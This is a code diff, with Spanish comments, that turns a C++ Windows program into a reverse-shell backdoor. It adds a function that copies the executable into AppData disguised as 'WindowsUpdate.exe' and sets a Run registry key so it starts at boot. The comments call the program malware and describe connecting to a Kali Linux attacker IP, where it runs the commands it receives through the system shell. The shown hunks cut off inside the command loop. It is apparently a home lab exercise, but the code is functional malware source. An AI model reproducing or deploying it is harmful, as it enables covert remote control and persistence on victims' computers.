@@ -8,13 +8,53 @@
 
 #include <memory>
 
+#include <windows.h> // Necesario para el Registro y la Persistencia
+
 
 
 #pragma comment(lib, "ws2_32.lib")
 
 
 
-// Esta es la función mágica que ejecuta el comando en el sistema operativo
+// --- 1. FUNCIÓN DE PERSISTENCIA ---
+
+void instalarPersistencia() {
+
+    char rutaPropia[MAX_PATH];
+
+    // Obtenemos la ruta donde está nuestro .exe ahora mismo
+
+    GetModuleFileNameA(NULL, rutaPropia, MAX_PATH);
+
+
+
+    // Definimos dónde queremos escondernos (En AppData como WindowsUpdate.exe)
+
+    std::string rutaDestino = std::string(getenv("APPDATA")) + "\\WindowsUpdate.exe";
+
+
+
+    // Nos copiamos a esa ruta de forma silenciosa
+
+    CopyFileA(rutaPropia, rutaDestino.c_str(), FALSE);
+
+
+
+    // Creamos la llave en el Registro de Windows para arrancar con el PC
+
+    HKEY hKey;
+
+    RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey);
+
+    RegSetValueExA(hKey, "ServicioTecnicoWindows", 0, REG_SZ, (BYTE*)rutaDestino.c_str(), rutaDestino.length());
+
+    RegCloseKey(hKey);
+
+}
+
+
+
+// --- 2. FUNCIÓN PARA EJECUTAR COMANDOS (RCE) ---
 
 std::string ejecutarComando(const char* cmd) {
 
@@ -23,8 +63,6 @@ std::string ejecutarComando(const char* cmd) {
     std::string resultado;
 
     
-
-    // _popen abre una tubería oculta con la consola de Windows (cmd.exe)
 
     std::unique_ptr<FILE, decltype(&_pclose)> pipe(_popen(cmd, "r"), _pclose);
 
@@ -35,8 +73,6 @@ std::string ejecutarComando(const char* cmd) {
     }
 
     
-
-    // Leemos el resultado y lo guardamos
 
     while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
 
@@ -50,7 +86,17 @@ std::string ejecutarComando(const char* cmd) {
 
 
 
+// --- 3. EL CORAZÓN DEL PROGRAMA (Un solo main) ---
+
 int main() {
+
+    // Lo primero que hace el malware al abrirse es instalarse en el sistema
+
+    instalarPersistencia();
+
+    
+
+    // Luego, prepara la conexión de red
 
     WSADATA wsaData;
 
@@ -74,11 +120,13 @@ int main() {
 
     
 
-    // PON AQUÍ LA IP DE TU KALI LINUX
+    // AQUÍ ESTÁ MI  IP DE KALI LINUX
 
     serv_addr.sin_addr.s_addr = inet_addr("10.0.2.15"); 
 
 
+
+    // Intentamos conectar al servidor
 
     if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
 
@@ -88,26 +136,10 @@ int main() {
 
 
 
+    // Bucle infinito esperando y ejecutando órdenes
+
     while (true) {
 
         memset(buffer, 0, 4096);
 
         int valread = recv(sock, buffer, 4096, 0);
-
-        if (valread <= 0) break;
-
-
-
-        // Aquí cambiamos el código: en vez de hacer eco, llamamos a la función de arriba
-
-        std::string comando(buffer);
-
-        std::string respuesta = ejecutarComando(comando.c_str());
-
-        
-
-        // Si el comando no devuelve texto (como crear una carpeta), enviamos esto:
-
-        if(respuesta.empty()){
-
-            respuesta = "Comando ejecutado sin salida de texto.\n";
